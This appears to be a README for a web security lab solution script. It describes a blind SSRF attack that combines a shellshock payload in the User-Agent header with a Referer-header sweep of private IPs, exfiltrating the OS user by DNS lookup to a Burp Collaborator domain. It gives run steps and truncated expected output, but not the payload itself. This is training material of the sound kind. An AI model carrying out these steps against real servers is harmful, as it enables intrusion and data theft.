# Hack Steps

1. Inject shellshock payload into the User-Agent header to exfiltrate the OS user via DNS lookup
2. Inject SSRF payload into the Referer header to iterate over all private IPs
3. Check your burp collaborator for the OS user in the DNS lookup
4. Submit the solution

# Run Script

1. Change the URL of the lab
2. Change the domain of the burp collaborator
3. Start script

```
~$ python blind_ssrf_with_shellshock_exploitation.py
```

# Expected Output

```
‚ü™#‚ü´ Injection point: User Agent & Referer headers
‚ùØ Injecting shellshock payload with SSRF to all private IPs (192.168.0.25:8080).. OK
